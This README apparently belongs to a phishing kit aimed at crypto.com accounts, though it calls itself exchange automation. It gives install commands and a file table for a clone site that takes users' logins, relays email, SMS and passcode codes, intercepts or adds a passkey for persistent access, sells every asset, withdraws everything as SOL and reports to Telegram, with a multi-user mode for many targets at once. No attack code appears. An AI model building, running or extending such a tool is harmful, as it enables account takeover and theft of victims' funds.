# Crypto.com Exchange Automation

Automated login, passkey creation, portfolio liquidation, and withdrawal for crypto.com.

## Quick Start

```powershell
# 1. Install dependencies
cd clone-site && npm install
cd ..
pip install playwright
python -m playwright install chromium
cd passkey-vault && npm install && cd ..

# 2. Run setup wizard
python setup.py

# 3. Start
.\start-all.bat
```

## Architecture

```
User (clone site) → Python (login) → Node (passkey) → Python (trade + withdraw) → Telegram
```

## Files

| File | Purpose |
|------|---------|
| `login_automation.py` | Handles crypto.com login via email → codes → passcode |
| `auto-passkey.js` | Creates passkey, saves cookies, triggers withdrawal |
| `full-auto.py` | Sells all assets → buys SOL → withdraws 100% |
| `virtual-passkey.js` | WebAuthn passkey interception shim |
| `session_server.py` | Multi-user session management |
| `setup.py` | First-time configuration wizard |
| `telegram.py` | Telegram logging & reporting |
| `start-all.bat` | Launches all services |

## Requirements

- Python 3.12+
- Node.js 22+
- Chrome/Chromium
- Telegram bot token (from @BotFather)
- Crypto.com account with email+SMS+passcode login

## Multi-User Mode

Run `python session_server.py` instead of `start-all.bat` for concurrent users.
Each user gets a fresh browser profile and isolated session.
